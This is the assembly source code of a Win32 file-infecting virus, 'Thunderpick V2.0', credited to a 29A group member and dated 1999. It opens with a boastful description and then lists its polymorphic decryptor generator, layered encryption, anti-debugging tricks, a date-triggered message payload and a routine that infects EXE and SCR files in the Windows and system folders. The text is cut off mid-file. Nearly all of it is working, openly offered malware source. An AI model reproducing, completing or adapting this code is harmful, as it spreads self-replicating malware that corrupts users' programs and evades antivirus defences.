   ;  comment $
   ;
   ;  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;
   ;   Thunderpick is my newest baby. Let's see a briefing about it:
   ;
   ;  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;
   ;   Virus Name    : Thunderpick V2.0
   ;   Virus Author      : Lord Julus / [29A]
   ;   Virus Size    : 7529 bytes
   ;   Release Date      : 1 Nov. 1999
   ;   Target OS     : Win32s, Windows 95/98, Windows NT, Windows 2000
   ;   Target Files      : PE Executbles (EXE, SCR)
   ;   Type          : Non-resident
   ;   Append Method     : Code section relocating and replacing
   ;   Encrypted     : Yes (multiple layers)
   ;   Polymorphic   : Yes (low-level polymorphism)
   ;   Avoid AV files    : Yes
   ;   Kill AV files     : Yes
   ;   Payload Date      : Day 07 of any month after hour 14:00
   ;   Payload       : Graphical
   ;
   ;  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;
   ;   The  name  of  this virus is the name of one of the best bass solos I
   ;  ever heard, sang by Joey DeMaio from Manowar and which appeared on the "Sign
   ;  of the hammer" album. You should hear it!!
   ;
   ;   As  being  a pure Win32 application this virus should have no problem
   ;  in  working  under all actual Win32 environments. The anti-debugging feature
   ;  contains   a call to the IsDebuggerPresent API which doesn't exist on Win95.
   ;  However, to maintain the infection ability on this OS, the anti-debugging is
   ;  avoided a little if the OS is Win95.
   ;
   ;   What  is  unique  about this virus is it's appending method. What the
   ;  virus does when infecting a clean victim is this:
   ;
   ;   First the code section is located. If the virus length is bigger than
   ;  the victim's code section, the infection process stops. If the virus can fit
   ;  in  the  code    section  then  the  next  steps continue. The last section is
   ;  increased with the virus size plus some additional space. Then, a part equal
   ;  to  the  virus  size  is taken from the code section and copied into the new
   ;  increased  space  in  the  last  section.  After that the relocating code is
   ;  placed  after    it  as  the last piece of code there. All this amount of code
   ;  (original  moved  code  plus  relocating code) get heavily encrypted with an
   ;  algorithm  that  loops  about 500.000 times. Then the virus copied itself in
   ;  the  original code section, over the place which was moved at the end. Then,
   ;  the  entire virus body gets encrypted with two encryption layers. The deeper
   ;  one  is another loooong algorithm (executes around 450.000 instructions) and
   ;  the  above one is the polymorphic algorithm. Then all rearangements are made
   ;  in  the  PE  header,  making  the  entrypoint to point the virus code (which
   ;  resides  in the old code section). When the infected host executes the virus
   ;  will  execute    first.  After  that,  the  control  will  be  passed  to  the
   ;  relocating code which will copy the original code section back into it's old
   ;  place    and make a jump to it. All registers and flags are preserved. In this
   ;  way  the virus code can stay in the code section, making it's detection much
   ;  harder.
   ;
   ;   Please note that the place into the code section where the virus gets
   ;  placed is random. Also, some random size is added at the end of file to make
   ;  it even harder to remove.
   ;
   ;   About  polymorphism,  this  virus  doesn't have a polymorphic engine.
   ;  Instead the polymorphic decryptor is placed at the beginning of the code and
   ;  it gets mutated at infection time.
   ;
   ;   The  virus  avoids  to  infect  certain  anti-virus products and also
   ;  attempts to delete all AV checksum files it can find.
   ;
   ;   The  payload  triggers  on the 7th day of any month after 14:00 hour,
   ;  when a MessageBox displays a some verses... ;-)
   ;
   ;   Credits: Prizzy/29A (for the DR0 WinNT bug)
   ;
   ;   $

   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   .486p                          ;Ýneeded cpu
   .model flat, stdcall                   ;Ýmodel
   jumps                          ;Ýsolve jumps
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   TRUE  = 1                      ;Ýtrue value
   FALSE = 0                      ;Ýfalse value
   DEBUG = TRUE                       ;Ýdebug status
   GOAT  = TRUE                       ;Ýinfect goat files?
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   extrn ExitProcess      : proc              ;Ýexternals only required
   extrn GetModuleHandleA : proc              ;Ýonly by the first
   extrn GetProcAddress   : proc              ;Ýgeneration
   extrn MessageBoxA      : proc              ;Ý
   extrn CheckSumMappedFile:proc              ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   .data                          ;Ýdummy data area
   db 0                           ;Ý
   include w32nt_lj.inc                   ;Ýequates and structures
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   .code                          ;Ývirus code starts...
   start:                         ;Ý...here
          pusha                       ;Ýsave all registers
   ;mov eax, end-start                ;Ý
   poly_decryptor:                    ;Ý
          jmp virusrun                ;Ýthis is where the poly
          db 1000d dup(0h)                ;Ýdecryptor will be
   poly_code_start:                   ;Ý
          jmp virusrun                ;Ýneed this!!!
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   create_poly:                       ;ÝThe poly generator stars
   ; EDI = address of code to encrypt         ;Ýhere...
   ; ESI = address to place decryptor to          ;Ý
   ; ECX = length of code to encrypt          ;Ý
   ; EBX = address of code to decrypt at runtime      ;Ý
          pusha                       ;Ýsave data
          mov [ebp+address1], edi             ;Ý
          mov [ebp+address2], esi             ;Ý
          mov [ebp+length], ecx               ;Ý
          mov dword ptr [ebp+@100+1], ebx         ;Ýfill in code address
          mov eax, 0FFFFFFFEh             ;Ý
          call brandom32                  ;Ý
          mov dword ptr [ebp+@101+1], eax         ;Ýfill in key
          mov [ebp+polykey], eax              ;Ý
          mov dword ptr [ebp+@102+1], ecx         ;Ý
          mov eax, 0FFFFFFFEh             ;Ý
          call brandom32                  ;Ý
          mov dword ptr [ebp+@104+2], eax         ;Ýfill in value
          mov [ebp+value], eax            ;Ý
          mov eax, 0FFFFFFFEh             ;Ý
          call brandom32                  ;Ý
          mov dword ptr [ebp+@106+2], eax         ;Ýfill in key modifier
          mov [ebp+keymodif], eax             ;Ý
          mov ecx, 100h                   ;Ý
   mangle_loop:                       ;Ýchoose random registers
          lea ebx, [ebp+regs]             ;Ý
          lea edx, [ebp+regs]             ;Ý
          mov eax, 6                  ;Ý
          call brandom32                  ;Ý
          add ebx, eax                ;Ý
          mov eax, 6                  ;Ý
          call brandom32                  ;Ý
          add edx, eax                ;Ý
          mov al, byte ptr [edx]              ;Ý
          xchg al, byte ptr [ebx]             ;Ý
          mov byte ptr [edx], al              ;Ý
          loop mangle_loop                ;Ý
          mov al, [ebp+preg]              ;Ýfill pointer reg
          and byte ptr [ebp+@100], 11111000b      ;Ý
          or byte ptr [ebp+@100], al          ;Ý
                              ;Ý
          and byte ptr [ebp+@500+1], 11111000b    ;Ý
          or byte ptr [ebp+@500+1], al        ;Ý
                              ;Ý
          mov al, [ebp+kreg]              ;Ýfill key reg
          and byte ptr [ebp+@101], 11111000b      ;Ý
          or byte ptr [ebp+@101], al          ;Ý
          and byte ptr [ebp+@106+1], 11111000b    ;Ý
          or byte ptr [ebp+@106+1], al        ;Ý
          mov al, [ebp+lreg]              ;Ýfill length reg
          and byte ptr [ebp+@102], 11111000b      ;Ý
          or byte ptr [ebp+@102], al          ;Ý
          mov al, [ebp+creg]              ;Ýfill code reg
          and byte ptr [ebp+@104+1], 11111000b    ;Ý
          or byte ptr [ebp+@104+1], al        ;Ý
          mov al, [ebp+creg]              ;Ýand others...;-/
          shl al, 3                   ;Ý
          or al, [ebp+kreg]               ;Ý
          and byte ptr [ebp+@105+1], 11000000b    ;Ý
          or byte ptr [ebp+@105+1], al        ;Ý
          mov al, [ebp+creg]              ;Ý
          shl al, 3                   ;Ý
          or al, [ebp+preg]               ;Ý
          and byte ptr [ebp+@103+1], 11000000b    ;Ý
          or byte ptr [ebp+@103+1], al        ;Ý
          and byte ptr [ebp+@107+1], 11000000b    ;Ý
          or byte ptr [ebp+@107+1], al        ;Ý
          mov al, [ebp+preg]              ;Ý
          and byte ptr [ebp+@108+1], 11111000b    ;Ý
          or byte ptr [ebp+@108+1], al        ;Ý
          mov al, [ebp+lreg]              ;Ý
          and byte ptr [ebp+@109], 11111000b      ;Ý
          or byte ptr [ebp+@109], al          ;Ý
          lea edi, [ebp+op1]              ;Ýchoose randomly the
          mov eax, 2                  ;Ýthree operations
          call brandom32                  ;Ý
          mov [ebp+index1], eax               ;Ý
          add edi, eax                ;Ý
          mov al, byte ptr [edi]              ;Ý
          mov byte ptr [ebp+@105], al         ;Ý
                              ;Ý
          lea edi, [ebp+op2]              ;Ý
          mov eax, 2                  ;Ý
          call brandom32                  ;Ý
          mov [ebp+index2], eax               ;Ý
          add edi, eax                ;Ý
          mov al, byte ptr [edi]              ;Ý
          and byte ptr [ebp+@104+1], 00000111b    ;Ý
          or byte ptr [ebp+@104+1], al        ;Ý
                              ;Ý
          lea edi, [ebp+op2]              ;Ý
          mov eax, 2                  ;Ý
          call brandom32                  ;Ý
          mov [ebp+index3], eax               ;Ý
          add edi, eax                ;Ý
          mov al, byte ptr [edi]              ;Ý
          and byte ptr [ebp+@106+1], 00000111b    ;Ý
          or byte ptr [ebp+@106+1], al        ;Ý
                              ;Ý
          lea esi, [ebp+@100]             ;Ýnow move the instruct.
          mov edi, [ebp+address2]             ;Ýand generate junk...
          lea ebx, [ebp+instr_len]            ;Ý
          mov eax, 1                  ;Ý
          call makejunk                   ;Ý
   move_decryptor:                    ;Ý
          mov ecx, [ebx]                  ;Ýget instruction length
          jcxz done_move                  ;Ý
          rep movsb                   ;Ýmove it!
          add ebx, 4                  ;Ý
          inc eax                     ;Ý
          cmp eax, 4                  ;Ý
          jne no_case                 ;Ý
          mov [ebp+save], edi             ;Ý
   no_case:                       ;Ý
          cmp eax, 11d                ;Ý
          je no_junk                  ;Ý
          call makejunk                   ;Ýdo junk!
   no_junk:                       ;Ý
          jmp move_decryptor              ;Ý
                              ;Ý
   done_move:                     ;Ý
          mov eax, edi                ;Ý
          sub eax, dword ptr [ebp+save]           ;Ý
          neg eax                     ;Ý
          mov dword ptr [edi-4], eax          ;Ý
                              ;Ý
          mov eax, [ebp+address2]             ;Ýfill in the jump to
          sub eax, edi                ;Ývirus body
          neg eax                     ;Ý
          mov ebx, poly_code_start-poly_decryptor     ;Ý
          sub ebx, eax                ;Ý
          mov edx, dword ptr [ebp+poly_code_start+1]  ;Ý
          add edx, ebx                ;Ý
          mov al, 0E9h                ;Ý
          stosb                       ;Ý
          mov eax, edx                ;Ý
          stosd                       ;Ý
                              ;Ý
          mov eax, [ebp+value]            ;Ýnow prepare the
          mov dword ptr [ebp+@200+2], eax         ;Ýencryptor to make the
          mov eax, [ebp+keymodif]             ;Ýencryption of the code
          mov dword ptr [ebp+@202+2], eax         ;Ý
                              ;Ý
          lea edi, [ebp+unop1]            ;Ý
          add edi, [ebp+index1]               ;Ý
          mov al, byte ptr [edi]              ;Ý
          mov byte ptr [ebp+@201], al         ;Ý
                              ;Ý
          lea edi, [ebp+unop2]            ;Ý
          add edi, [ebp+index2]               ;Ý
          mov al, byte ptr [edi]              ;Ý
          and byte ptr [ebp+@200+1], 00000111b    ;Ý
          or byte ptr [ebp+@200+1], al        ;Ý
                              ;Ý
          lea edi, [ebp+op2]              ;Ý
          add edi, [ebp+index3]               ;Ý
          mov al, byte ptr [edi]              ;Ý
          and byte ptr [ebp+@202+1], 00000111b    ;Ý
          or byte ptr [ebp+@202+1], al        ;Ý
                              ;Ý
          mov edi, [ebp+address1]             ;Ý
          mov ebx, [ebp+polykey]              ;Ý
          mov ecx, [ebp+length]               ;Ý
                              ;Ý
   encrypt_poly:                      ;Ýencrypt the code!
          mov edx, [edi]                  ;Ý
   @201:  add edx, ebx                ;Ý
   @200:  add edx, 12345678h              ;Ý
   @202:  add ebx, 12345678h              ;Ý
          mov [edi], edx                  ;Ý
          add edi, 4                  ;Ý
          dec ecx                     ;Ý
          jnz encrypt_poly                ;Ý
          popa                    ;Ý
          ret                     ;Ý
                              ;Ý
   makejunk:                      ;Ýhere we make some
          push eax ebx                ;Ýrandom amount of junk
          mov al, 0E9h                ;Ý
          stosb                       ;Ý
          xor eax, eax                ;Ý
          stosd                       ;Ý
          mov ebx, edi                ;Ý
          mov eax, 30                 ;Ý
          call brandom32                  ;Ý
          inc eax                     ;Ý
          mov ecx, eax                ;Ý
                              ;Ý
   junk_loop:                     ;Ý
          mov eax, 0FFFFFFFEh             ;Ý
          call brandom32                  ;Ý
          stosd                       ;Ý
          loop junk_loop                  ;Ý
                              ;Ý
          mov eax, edi                ;Ý
          sub eax, ebx                ;Ý
          mov dword ptr [ebx-4], eax          ;Ý
          pop ebx eax                 ;Ý
          ret                     ;Ý
   @100:  mov ebx, 12345678h              ;Ýstore code offset
   @500:  add ebx, 12345678h              ;Ý
   @101:  mov ebx, 12345678h              ;Ýstore key
   @102:  mov ebx, 12345678h              ;Ýstore length
   @103:  mov ebx, [ebx]                  ;Ýget a dword
   @104:  add ebx, 12345678h              ;Ýdecrypt with value
   @105:  add ebx, ebx                ;Ýdecrypt with key
   @106:  add ebx, 12345678h              ;Ýmodify key
   @107:  mov [ebx], ebx                  ;Ýstore dword
   @108:  add ebx, 4                  ;Ýincrease pointer
   @109:  dec ebx                     ;Ýdecrease length
          jz @10A                     ;Ýuntil the end
          db 0E9h                     ;Ý
          dd 0                    ;Ý
   @10A:                          ;Ý
   polykey  dd 0                      ;Ý
   value    dd 0                      ;Ý
   keymodif dd 0                      ;Ý
   length   dd 0                      ;Ý
   address1 dd 0                      ;Ý
   address2 dd 0                      ;Ý
   save     dd 0                      ;Ý
   finito   dd 0                      ;Ý
   regs:                          ;Ý
   creg  db 0                     ;Ý code
   lreg  db 1                     ;Ý length of code
   kreg  db 2                     ;Ý encryption key
   preg  db 3                     ;Ý pointer in code
   jreg2 db 6                     ;Ý Junk register #1
   jreg3 db 7                     ;Ý Junk register #2
                              ;Ý
   op1   db 33h, 2Bh, 03h                 ;Ý
   unop1 db 33h, 03h, 2Bh                 ;Ý
                              ;Ý
   op2   db 11110000b, 11101000b, 11000000b       ;Ý
   unop2 db 11110000b, 11000000b, 11101000b       ;Ý
                              ;Ý
   index1 dd 0                    ;Ý
   index2 dd 0                    ;Ý
   index3 dd 0                    ;Ý
                              ;Ý
   instr_len dd @101-@100, @102-@101, @103-@102       ;Ý
         dd @104-@103, @105-@104, @106-@105       ;Ý
         dd @107-@106, @108-@107, @109-@108       ;Ý
         dd @10A-@109, 0              ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   virusrun:                      ;Ý
          call getdelta                   ;Ýget delta handle
                              ;Ý
   getdelta:                      ;Ý
          pop ebp                     ;Ý
          sub ebp, offset getdelta            ;Ý
          call @13                    ;Ýnow obtain the imagebase
   @13:   pop eax                     ;Ýwhere the host loaded
   @12:   sub eax, 00001000h+(@12-start)-1        ;Ý
          mov dword ptr [ebp+imagebase], eax      ;Ýand save it...
          jmp done                    ;Ý
          imagebase dd 00400000h              ;Ýdefault imagebase
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   done:                          ;Ý
          cmp [ebp+first_gen], 0              ;Ýdon't decrypt for
          je decrypt_level_2              ;Ýgen. 1
                              ;Ý
          mov ecx, 100h                   ;Ý
                              ;Ý
   decrypt_iteration:                 ;Ý
          mov edx, 'DEAD'+'MEAT'              ;Ýinitialize decryptor
          lea edi, [ebp+decrypt_level_2]          ;Ý
          mov esi, edi                ;Ý
          mov ebx, (end-decrypt_level_2)/4        ;Ý
                              ;Ý
   decrypt_routine:                   ;Ý
          lodsd                       ;Ýdo decryption.
          ror eax, 16                 ;ÝThis decryptor loops
          xor eax, 'LORD'+'JULU'+'S'          ;Ýabout 310.000 times
          rol eax, 16                 ;Ýand executes thou
          add eax, 'THUN'+'DERP'+'ICK'        ;Ýaround 4.650.000
          sub eax, edx                ;Ýinstructions.
          add edx, 'KICK'+'ASS!'              ;Ý
          stosd                       ;Ý
          dec ebx                     ;Ý
          jnz decrypt_routine             ;Ý
          loop decrypt_iteration              ;Ý
          mov [ebp+delta], ebp            ;Ýsave delta for later
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   decrypt_level_2:                   ;Ý
          IF DEBUG                    ;Ýif debug is off we
          ELSE                    ;Ýalso need to restore
          mov [ebp+delta2], ebp               ;Ýthis...
          ENDIF                       ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
          jmp FindNeededStuff             ;Ýget module bases and
   first_gen db 0                     ;Ýapi addresses.
   db " ThunderPick V2.0 Release November 1999 "      ;Ý
   db " by Lord Julus / [29A]          "      ;Ý
   FinishedLocatingStuff:                 ;Ýif successful...
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Anti_Debugging:                    ;Ý
          IF DEBUG                    ;Ýif this is the release
          ELSE                    ;Ýversion, we must do the
          lea eax, [ebp+DebuggerKill]         ;Ýantidebugging stuffs.
          push eax                    ;ÝHere we set up a new
          xor ebx, ebx                ;Ýseh frame and then we
          push dword ptr fs:[ebx]             ;Ýmake an exception error
          mov fs:[ebx], esp               ;Ýoccur.
          dec dword ptr [ebx]             ;ÝTD stops here if in
                              ;Ýdefault mode.
          push 0                      ;Ýif instruction is not
          jmp Anti_Debugging              ;Ýexecuted the system will
                              ;Ýhalt...
   DebuggerKill:                      ;Ý
          mov esp, [esp+8]                ;Ýthe execution goes here
          pop dword ptr fs:[0]            ;Ý
          add esp, 4                  ;Ý
                              ;Ý
          db 0BDh                     ;Ýdelta gets lost so we
   delta2 dd 0                    ;Ýmust restore it...
                              ;Ý
          call @6                     ;Ýhere we try to retrieve
          db 'IsDebuggerPresent', 0           ;ÝIsDebuggerPresent API
   @6:    push [ebp+k32]                  ;Ýif we fail it means we
          call [ebp+_GetProcAddress]          ;Ýdon't have this api
          or eax, eax                 ;Ý(Windows95)
          jz continue_process             ;Ý
                              ;Ý
          call eax                    ;ÝLet's check if our
          or eax, eax                 ;Ýprocess is being
          jne shut_down                   ;Ýdebugged.
          jmp continue_process            ;Ý
                              ;Ý
          shut_down:                  ;Ý
          push 0                      ;ÝIf so, close down!!
          call [ebp+_ExitProcess]             ;Ýclose
          ENDIF                       ;Ý
   continue_process:                  ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
          cmp [ebp+first_gen], 0              ;Ýa little trick to
          jne ok_                     ;Ýensure the right run
          mov [ebp+gen1], 1               ;Ýof the first gen.
          jmp ok__                    ;Ý
                              ;Ý
   ok_:                           ;Ý
          mov [ebp+gen1], 0               ;Ý
                              ;Ý
   ok__:                          ;Ý
          call Randomize                  ;Ýinitialize random gen.
          call Decrypt                ;Ýdecrypt stuff
          call Payload                ;Ýtry the payload
          call Infect                 ;Ýinfect files
          call KillAV                 ;Ýkill av files
          jmp ReturnToHost                ;Ýand return to host
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Decrypt:                       ;Ý
          cmp [ebp+first_gen], 0              ;Ýlet's decrypt the orig.
          jne do_it                   ;Ýcode and the relocating
          ret                     ;Ýcode.
                              ;Ý
   do_it:                         ;Ý
          pusha                       ;Ýsave regs
          lea ebx, [ebp+key]              ;Ý
          mov eax, dword ptr [ebx]            ;Ýget key
          mov esi, dword ptr [ebp+increment]      ;Ýget key increment
   @10:   mov edi, 12345678h              ;Ýaddress of code
          add edi, [ebp+imagebase]            ;Ý
          mov ecx, incrsize/4             ;Ýsize of code
          mov ebx, dword ptr [ebp+iterations]     ;Ýnumber of iterations
          push edi                    ;Ýsave edi
                              ;Ý
   decrypt_loop:                      ;Ý
          mov edx, [edi]                  ;Ýget dword
          add edx, eax                ;Ýincrement with key
          sub eax, esi                ;Ýincrement key
          xor edx, esi                ;Ýxor with increment
          ror edx, 1                  ;Ýrotate
          mov [edi], edx                  ;Ýand store
          add edi, 4                  ;Ýgo to next dword
          loop decrypt_loop               ;Ýloop until end
          dec ebx                     ;Ýdecrement iterations
          jz ready                    ;Ý
          lea ecx, [ebp+key]              ;Ý
          mov eax, [ecx]                  ;Ý
          mov ecx, incrsize/4             ;Ýredo all...
          pop edi                     ;Ý
          push edi                    ;Ý
          jmp decrypt_loop                ;Ý
                              ;Ý
   ready:                         ;Ý
          pop edi                     ;Ý
          popa                    ;Ý
          ret                     ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Payload:                       ;Ý
          pusha                       ;Ý
          call @30                    ;Ý
   time   SYSTEMTIME <0>                  ;Ý
   @30:   call [ebp+_GetSystemTime]           ;Ý
                              ;Ý
          lea edi, [ebp+time]             ;Ý
          cmp dword ptr [edi.ST_wDay], 7          ;Ý
          jne nopayload                   ;Ý
          cmp dword ptr [edi.ST_wHour], 14d       ;Ý
          jbe nopayload                   ;Ý
                              ;Ý
          push 1000h                  ;Ý
          call @31                    ;Ý
          db 'Win32.ThunderPick / [29A]',0        ;Ý
   @31:   call @32                    ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
          db 10,13,'   It''s  time  for  the  Thunder...     ',10,13  ;Þ
          db   '   It''s  time  for  the  Pick...        ',10,13  ;Þ
          db   '   And it''s  time  for  the  Rocker     ', 10,13 ;Þ
          db   '   Your  bottom  to  kick !!!        ',10,13,0;Þ
   @32:   push 0                      ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
          call [ebp+_MessageBoxA]             ;Ý
                              ;Ý
   nopayload:                     ;Ý
          popa                    ;Ý
          ret                     ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Infect:                        ;Ý
          mov [ebp+first_gen], 1              ;Ýmark the first gen.
          push 0                      ;ÝGet the drive type. If
          call [ebp+_GetDriveTypeA]           ;Ýit is a fixed drive
          sub [ebp+crt_dir_flag], eax         ;Ýthan this value = 0
                              ;Ý
          push 260                    ;ÝGet Windows directory
          call @1                     ;Ý
   windir db 260 dup(0)                   ;Ý
   @1:    call [ebp+_GetWindowsDirectoryA]        ;Ý
                              ;Ý
          push 260                    ;ÝGet System directory
          call @2                     ;Ý
   sysdir db 260 dup(0)                   ;Ý
   @2:    call [ebp+_GetSystemDirectoryA]         ;Ý
                              ;Ý
          call @3                     ;ÝGet current directory
   crtdir db 260 dup(0)                   ;Ý
   @3:    push 260                    ;Ý
          call [ebp+_GetCurrentDirectoryA]        ;Ý
                              ;Ý
          cmp dword ptr [ebp+crt_dir_flag], 0     ;Ýare we on a fixed disk?
          jne direct_to_windows               ;Ý
                              ;Ý
          mov dword ptr [ebp+infections], 0FFFFh      ;Ýinfect all files there
          call Infect_Directory               ;Ý
                              ;Ý
   direct_to_windows:                 ;Ý
          cmp [ebp+gen1], 1               ;Ýfirst generation?
          je back_to_current_dir              ;Ý
          lea eax, [ebp+offset windir]        ;ÝChange to Windows dir.
          push eax                    ;Ý
          call [ebp+_SetCurrentDirectoryA]        ;Ý
                              ;Ý
          mov dword ptr [ebp+infections], 3       ;Ýinfect 3 files there
          call Infect_Directory               ;Ý
                              ;Ý
          lea eax, [ebp+offset sysdir]        ;ÝChange to System dir.
          push eax                    ;Ý
          call [ebp+_SetCurrentDirectoryA]        ;Ý
                              ;Ý
          mov dword ptr [ebp+infections], 3       ;Ýinfect 3 files there
          call Infect_Directory               ;Ý
                              ;Ý
   back_to_current_dir:                   ;Ý
          lea eax, [ebp+offset crtdir]        ;ÝChange back to crt dir.
          push eax                    ;Ý
          call [ebp+_SetCurrentDirectoryA]        ;Ý
          ret                     ;Ý
   infections   dd 0                  ;Ý
   crt_dir_flag dd 3                  ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Infect_Directory:                  ;Ý
          mov [ebp+crt_dir_flag], 3           ;Ýreset this
          xor esi, esi                ;Ý
                              ;Ý
   re_do:                         ;Ý
          call @4                     ;Ýlocate first matching
          finddata WIN32_FIND_DATA <?>        ;Ýfile.
   @4:    or esi, esi                 ;Ý
          jnz next_mask                   ;Ý
          call @5                     ;Ý
          IF GOAT                     ;Ý
          filemask1 db 'goat*.exe',0          ;Ý
          ELSE                    ;Ý
          filemask1 db '*.EXE',0              ;Ý
          ENDIF                       ;Ý
                              ;Ý
   next_mask:                     ;Ý
          call @5                     ;Ý
          IF GOAT                     ;Ý
          filemask2 db 'goat*.scr', 0         ;Ý
          ELSE                    ;Ý
          filemask2 db '*.SCR', 0             ;Ý
          ENDIF                       ;Ý
   @5:    call [ebp+_FindFirstFileA]          ;Ý
          mov [ebp+findhandle], eax           ;Ý
                              ;Ý
   compare:                       ;Ý
          call CheckError                 ;Ý
          jc get_next                 ;Ý
                              ;Ý
          lea edi, [ebp+finddata.WFD_cFileName]       ;Ýget name
          call Infect_File                ;Ýand infect it
          jc no_infection                 ;Ý
          dec [ebp+infections]            ;Ý
          jz finished_infection               ;Ý
                              ;Ý
   no_infection:                      ;Ý
          lea ebx, [ebp+finddata]             ;Ýlocate next matching
          push ebx                    ;Ýname.
          push [ebp+findhandle]               ;Ý
          call [ebp+_FindNextFileA]           ;Ý
          jmp compare                 ;Ý
                              ;Ý
   get_next:                      ;Ý
          cmp esi, extensions             ;Ý
          je finished_infection               ;Ý
          inc esi                     ;Ý
          jmp re_do                   ;Ý
                              ;Ý
   finished_infection:                ;Ý
          push [ebp+findhandle]               ;Ý
          call [ebp+_FindClose]               ;Ý
          ret                     ;Ý
   extensions equ 1                   ;Ý
   findhandle dd 0                    ;Ý
